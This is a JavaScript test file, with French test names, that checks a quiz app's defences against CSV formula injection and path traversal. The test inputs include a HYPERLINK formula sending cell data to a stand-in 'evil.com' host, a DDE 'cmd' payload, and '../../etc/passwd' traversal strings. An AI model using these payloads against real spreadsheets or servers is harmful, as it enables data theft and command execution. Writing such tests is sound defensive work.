import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { createRequire } from "module";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const require = createRequire(import.meta.url);
const __dirname = path.dirname(fileURLToPath(import.meta.url));

process.env.LFDS_API_KEY = "test-key-12345";
const { app, escapeCsvField, isValidSessionId } = require("../index.js");
const request = (await import("supertest")).default;

const DATA_DIR = path.join(__dirname, "..", "data");

function cleanup() {
  if (fs.existsSync(DATA_DIR)) {
    fs.readdirSync(DATA_DIR).forEach((f) => {
      fs.unlinkSync(path.join(DATA_DIR, f));
    });
  }
}

beforeAll(cleanup);
afterAll(cleanup);

// ─── escapeCsvField ───

describe("escapeCsvField — injection de formules", () => {
  it("neutralise = en debut de champ", () => {
    expect(escapeCsvField("=1+1")).toBe("\"'=1+1\"");
  });

  it("neutralise + en debut de champ", () => {
    expect(escapeCsvField("+cmd")).toBe("\"'+cmd\"");
  });

  it("neutralise - en debut de champ", () => {
    expect(escapeCsvField("-2+3")).toBe("\"'-2+3\"");
  });

  it("neutralise @ en debut de champ", () => {
    expect(escapeCsvField("@SUM(A1)")).toBe("\"'@SUM(A1)\"");
  });

  it("neutralise une tabulation en debut de champ", () => {
    expect(escapeCsvField("\tcmd")).toBe("\"'\tcmd\"");
  });

  it("neutralise un retour chariot en debut de champ", () => {
    expect(escapeCsvField("\rcmd")).toBe("\"'\rcmd\"");
  });

  it("laisse les valeurs normales intactes", () => {
    expect(escapeCsvField("bonjour")).toBe('"bonjour"');
  });

  it("echappe les guillemets internes", () => {
    expect(escapeCsvField('il a dit "oui"')).toBe('"il a dit ""oui"""');
  });

  it("gere null", () => {
    expect(escapeCsvField(null)).toBe('""');
  });

  it("gere undefined", () => {
    expect(escapeCsvField(undefined)).toBe('""');
  });

  it("gere les nombres", () => {
    expect(escapeCsvField(42)).toBe('"42"');
  });

  it("gere 0", () => {
    expect(escapeCsvField(0)).toBe('"0"');
  });

  it("neutralise une formule complexe", () => {
    const payload = '=HYPERLINK("http://evil.com/steal?d="&A1,"Click")';
    const result = escapeCsvField(payload);
    expect(result.startsWith('"\'=')).toBe(true);
  });
});

// ─── isValidSessionId ───

describe("isValidSessionId — path traversal", () => {
  it("accepte un ID alphanumerique", () => {
    expect(isValidSessionId("abc-123_XYZ")).toBe(true);
  });

  it("rejette ../", () => {
    expect(isValidSessionId("../../etc/passwd")).toBe(false);
  });

  it("rejette un slash", () => {
    expect(isValidSessionId("foo/bar")).toBe(false);
  });

  it("rejette un backslash", () => {
    expect(isValidSessionId("foo\\bar")).toBe(false);
  });

  it("rejette une chaine vide", () => {
    expect(isValidSessionId("")).toBe(false);
  });

  it("rejette un non-string", () => {
    expect(isValidSessionId(123)).toBe(false);
    expect(isValidSessionId(null)).toBe(false);
  });
});

// ─── Endpoints ───

describe("POST /api/quiz/submit — validation", () => {
  it("rejette un body vide", async () => {
    const res = await request(app).post("/api/quiz/submit").send({});
    expect(res.status).toBe(400);
  });

  it("rejette un session_id avec path traversal", async () => {
    const res = await request(app)
      .post("/api/quiz/submit")
      .send({ session_id: "../../etc/passwd" });
    expect(res.status).toBe(400);
    expect(res.body.error).toMatch(/Invalid/i);
  });

  it("accepte un session_id valide", async () => {
    const res = await request(app)
      .post("/api/quiz/submit")
      .send({ session_id: "test-session-001" });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });
});

describe("GET /api/admin/export/csv — securite", () => {
  it("refuse sans cle API", async () => {
    const res = await request(app).get("/api/admin/export/csv");
    expect(res.status).toBe(401);
  });

  it("neutralise les formules dans l'export", async () => {
    await request(app).post("/api/quiz/submit").send({
      session_id: "csv-inject-test",
      contact: { email: "=cmd|'/c calc'!A1", consent_given: true },
      profile: { primary: "+EVIL", secondary: "artisan", scores: {} },
      answers: [],
    });

    const res = await request(app)
      .get("/api/admin/export/csv")
      .set("x-api-key", "test-key-12345");

    expect(res.status).toBe(200);
    expect(res.headers["content-type"]).toMatch(/text\/csv/);

    const csv = res.text;
    expect(csv).not.toContain('"=cmd');
    expect(csv).not.toContain('"+EVIL');
    expect(csv).toContain("'=cmd");
    expect(csv).toContain("'+EVIL");
  });
});

describe("GET /api/admin/submissions/:id — path traversal", () => {
  it("rejette un ID avec ../", async () => {
    const res = await request(app)
      .get("/api/admin/submissions/..%2F..%2Fetc%2Fpasswd")
      .set("x-api-key", "test-key-12345");
    expect(res.status).toBe(400);
  });
});

describe("DELETE /api/admin/submissions/:id — path traversal", () => {
  it("rejette un ID avec ../", async () => {
    const res = await request(app)
      .delete("/api/admin/submissions/..%2F..%2Fetc%2Fpasswd")
      .set("x-api-key", "test-key-12345");
    expect(res.status).toBe(400);
  });
});
